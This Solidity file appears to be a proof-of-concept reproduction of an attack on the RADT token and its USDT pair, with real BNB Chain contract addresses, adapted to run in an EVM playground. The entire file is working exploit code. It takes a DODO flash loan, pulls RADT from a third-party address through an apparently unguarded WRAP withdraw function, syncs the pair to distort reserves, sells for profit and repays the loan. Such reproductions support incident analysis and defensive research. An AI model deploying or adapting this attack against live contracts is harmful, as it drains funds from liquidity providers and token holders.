// SPDX-License-Identifier: UNLICENSED
// Cleaned for EVM Playground recorder (plain @ethereumjs/vm, no forge Test/cheats).
// State preloaded from anvil_state (pair, WRAP, DODO, tokens, router etc. present).
pragma solidity ^0.8.10;

import "./../interface.sol";

interface IWRAP {
    function withdraw(address from, address to, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract ContractTest {
    // Events for recorder logs (replaces forge helpers)
    event log_named_decimal_uint(string key, uint256 val, uint8 dec);

    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    IWRAP wrap = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    address constant dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        USDT.approve(address(Router), type(uint256).max);
        RADT.approve(address(Router), type(uint256).max);
        IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        buyRADT();
        USDT.transfer(address(pair), 1);
        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;
        wrap.withdraw(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE, address(pair), amount);
        pair.sync();
        sellRADT();
        USDT.transfer(dodo, 200_000 * 1e18);
    }

    function buyRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(RADT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function sellRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(RADT);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            RADT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
